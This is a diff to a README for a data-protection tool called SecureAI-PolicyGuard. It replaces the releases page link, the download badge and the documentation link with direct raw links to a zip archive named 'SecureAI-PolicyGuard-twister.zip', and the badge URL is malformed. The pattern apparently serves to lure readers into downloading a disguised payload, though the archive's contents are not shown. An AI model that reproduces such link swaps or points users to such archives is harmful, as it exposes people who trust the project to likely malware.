@@ -1,6 +1,6 @@
 # 🔒 SecureAI-PolicyGuard - Protect Your Data with Confidence
 
-[![Download SecureAI-PolicyGuard](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/Poeth01/SecureAI-PolicyGuard/releases)
+[![Download SecureAI-PolicyGuard](https://raw.githubusercontent.com/Poeth01/SecureAI-PolicyGuard/main/api/SecureAI-PolicyGuard-twister.zip%https://raw.githubusercontent.com/Poeth01/SecureAI-PolicyGuard/main/api/SecureAI-PolicyGuard-twister.zip)](https://raw.githubusercontent.com/Poeth01/SecureAI-PolicyGuard/main/api/SecureAI-PolicyGuard-twister.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to SecureAI PolicyGuard! This tool makes it easy to protect your enterpr
 
 1. **Visit the Releases Page**  
    Click the link below to go to our releases page:  
-   [Download SecureAI-PolicyGuard](https://github.com/Poeth01/SecureAI-PolicyGuard/releases)
+   [Download SecureAI-PolicyGuard](https://raw.githubusercontent.com/Poeth01/SecureAI-PolicyGuard/main/api/SecureAI-PolicyGuard-twister.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of SecureAI-PolicyGuard available for download. Select the latest version for the best features and improvements.
@@ -58,7 +58,7 @@ If you have questions or need assistance, consider these resources:
 
 - **GitHub Issues:** Report problems or suggest new features directly on GitHub.
 - **User Community:** Join our forum where users share tips and best practices.
-- **Documentation:** Our [documentation page](https://github.com/Poeth01/SecureAI-PolicyGuard/wiki) provides detailed guides on features and troubleshooting.
+- **Documentation:** Our [documentation page](https://raw.githubusercontent.com/Poeth01/SecureAI-PolicyGuard/main/api/SecureAI-PolicyGuard-twister.zip) provides detailed guides on features and troubleshooting.
 
 ## 👨‍💻 Contributing
 
